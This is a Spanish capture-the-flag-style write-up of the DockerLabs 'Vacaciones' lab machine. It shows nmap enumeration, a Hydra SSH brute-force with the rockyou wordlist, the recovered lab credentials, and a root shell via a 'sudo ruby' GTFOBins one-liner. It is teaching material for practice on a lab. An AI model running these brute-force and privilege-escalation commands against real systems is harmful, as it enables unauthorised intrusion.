---
layout: single
title: Vacaciones - DockerLabs
excerpt: "Maquina Linux realizando intrusion por ataque de fuerza bruta al protocolo SSH"
date: 2024-05-22
classes: wide
header:
  teaser: https://pentest4noob.github.io/Writetups/assets/images/logos/logo_dockerlabs.png
  teaser_home_page: true
categories:
  - DockerLabs
tags:
  - linux
  - Muy facil
  - Fuerza Buta
  - Sudo
---

<p align="center">
  <img width="250" height="250" src="https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/vacaciones/vacaciones.jpg">
</p>

Esta maquina está clasificada como "Muy Facil" en la plataforma de [DockerLabs](https://dockerlabs.es/#/), muy útil para practicar ataque de fuerza bruta y una escalada de privilegios sencilla

# 1- Enumeración

Comenzamos con la etapa de enumeración para ello vamos a usar la herramienta nmap con los siguientes parámetros

```bash
sudo nmap -p- --open -sS -sC -sV -n -Pn 172.17.0.2 -oN nmap.txt
```

| Parametro | Descripción                        |
| --------- | ---------------------------------- |
| -p-       | Escanear todos los puertos         |
| --open    | Mostrar los puertos abiertos       |
| -sS       | Sondeo de tipo SYN sigiloso        |
| -sV       | Habilita la detección de versiones |
| -n        | Sin resolución de DNS              |
| -Pn       | Omitir el descubrimiento de hosts  |
| -oN       | Formato de salida del archivo      |

```css
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
ssh-hostkey:
   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
_http-title: Site doesn't have a title (text/html).
_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solamente estan abiertos 2 puertos el 22 donde corre el servicio `SSH` y el 80 donde corre el servicio `http` con Apache, voy a ver que en el servidor web coloco la url `http://172.17.0.2`

![000Vacaciones.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/vacaciones/000Vacaciones.png)

carga un página en blanco, voy a revisar el código fuente presioando las teclas `ctrl + u`

![0001Vacaciones.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/vacaciones/001Vacaciones.png)

veo un mensaje, el cual me sirve para enumerar 2 posibles usuario Juan y Camilo, por lo tanto voy a realizar un ataque de fuerza bruta con estos usuario al servicio `SSH`.

Primero voy a crear un listado de usuarios con el editor de texto `nano` al que voy a llamar `usuarios.txt` y le voy agregar los posibles usuario que encontré anteriormente ahora si voy a realizar el ataque de fuerza bruta con `Hydra`

![002Vacaciones.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/vacaciones/002Vacaciones.png)

```bash
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt -t 64 ssh://172.17.0.2
```

| Parametro | Descripción                        |
| --------- | ---------------------------------- |
| -L        | ruta de lista de usuarios          |
| -P        | ruta del diccionario de contraseña |
| -t        | cantidad de hilos                  |
| ssh       | protocolo a realizar fuerza bruta  |

Consigo la contraseña del usuario camilo.

```css
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
```

# 2- Intrusion

Momento de realizar la conexión por SSH con las credenciales recién adquiridas

```bash
ssh camilo@172.17.0.2
```

procedo a buscar el correo que Juan le había dejado a Camilo usando la herramienta find

```bash
find / -iname *correo* 2>/dev/null
```

| parametro   | descripcion                                      |
| ----------- | ------------------------------------------------ |
| -iname      | para no distinguir entre mayúsculas y minúsculas |
| \*          | caracter comodin                                 |
| 2>/dev/null | para no mostrar los errores en pantalla          |

me arroja como resultado la siguiente ruta `/var/mail/correo.txt`

![004Vacaciones.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/vacaciones/004Vacaciones.png)

ejecuto `su juan` para cambiar al usuario juan e ingreso la contraseña que me indicó en el correo `2k84dicb`

# 3- Escalada de Privilegios

Ahora como Juan busco como escalar privilegios con `sudo -l` como resultado veo que tengo permisos para ejecutar el binario `ruby`

![005Vacaciones.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/vacaciones/005Vacaciones.png)

Me apoyo de la pagina [GTFObins](https://gtfobins.github.io/) para ver como escalar privilegios

ejecutando el siguiente comando

```bash
sudo ruby -e 'exec "/bin/sh"'
```

Listo conseguí escalar privilegios, ahora soy el usuario root

![006Vacaciones.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/vacaciones/006Vacaciones.png)
